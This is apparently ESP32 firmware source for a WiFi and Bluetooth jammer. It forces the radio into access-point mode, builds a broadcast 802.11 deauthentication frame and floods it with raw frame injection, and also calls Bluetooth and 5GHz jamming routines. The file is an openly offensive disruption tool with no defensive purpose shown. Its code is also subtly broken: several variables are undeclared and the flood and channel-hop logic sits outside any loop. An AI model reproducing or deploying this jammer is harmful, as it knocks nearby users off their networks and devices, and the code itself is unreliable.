/*
 * attack_jammer.c — WiFi + Bluetooth Jammer
 * 2.4GHz: ESP32-S3 channel flood
 * 5GHz: BW16 via UART
 * BT: BLE advertisement flood + classic BT LMP noise
 */

#include "attack_jammer.h"
#include "attack_bluetooth_jammer.h"   // ← Added for real BT jammer
#include "bw16_uart.h"
#include "esp_rom_sys.h"
#include <string.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "JAMMER";
static TaskHandle_t jammer_task = NULL;
static volatile bool jammer_wifi_running = false;
static volatile bool jammer_bt_running = false;
static volatile uint64_t jammer_packets = 0;

static void jammer_wifi_func(void *params) {
    jammer_wifi_running = true;
    ESP_LOGI(TAG, "🔥 WiFi Jammer started — flooding all channels");

    // FIX: WiFi mode check — esp_wifi_80211_tx() কাজ করার জন্য AP বা APSTA মোড প্রয়োজন
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);
    if (current_mode != WIFI_MODE_AP && current_mode != WIFI_MODE_APSTA) {
        ESP_LOGW(TAG, "WiFi mode %d not suitable for jamming. Switching to APSTA...", current_mode);
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
        
        // Start minimal AP so frame injection works
        wifi_config_t ap_cfg = {
            .ap = {
                .ssid = "JAM",
                .ssid_len = 3,
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 0,
                .beacon_interval = 1000,
            }
        };
        esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        esp_wifi_start();
        vTaskDelay(pdMS_TO_TICKS(200));

        uint8_t deauth_pkt[26] = {
            0xC0, 0x00, 0x00, 0x00,
            broadcast[0], broadcast[1], broadcast[2], broadcast[3], broadcast[4], broadcast[5],
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            0x00, 0x00, 0x07, 0x00
        };

        for (int i = 0; i < 20; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
            jammer_packets++;
        }

        ch = (ch % 13) + 1;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    if (bw16_is_connected()) bw16_jammer_stop();
    jammer_wifi_running = false;
    jammer_task = NULL;
    vTaskDelete(NULL);
}

void jammer_wifi_start(void) {
    if (jammer_wifi_running) return;
    xTaskCreatePinnedToCore(jammer_wifi_func, "jammer_wifi", 4096, NULL, 5, &jammer_task, 0);
    ESP_LOGI(TAG, "WiFi jammer task created");
}

void jammer_bt_start(void) {
    if (jammer_bt_running) return;
    bt_jammer_start();              // ← Real BT jammer call
    jammer_bt_running = true;
    ESP_LOGI(TAG, "BT Jammer started via attack_bluetooth_jammer");
}

void jammer_stop(void) {
    jammer_wifi_running = false;
    jammer_bt_running = false;
    bt_jammer_stop();               // ← Stop BT jammer too
    if (bw16_is_connected()) bw16_jammer_stop();
    vTaskDelay(pdMS_TO_TICKS(200));
    ESP_LOGI(TAG, "All jammers stopped. Packets sent: %llu", jammer_packets);
}

bool jammer_wifi_is_running(void) { return jammer_wifi_running; }
bool jammer_bt_is_running(void) { return jammer_bt_running; }
uint64_t jammer_get_packets(void) { return jammer_packets; }
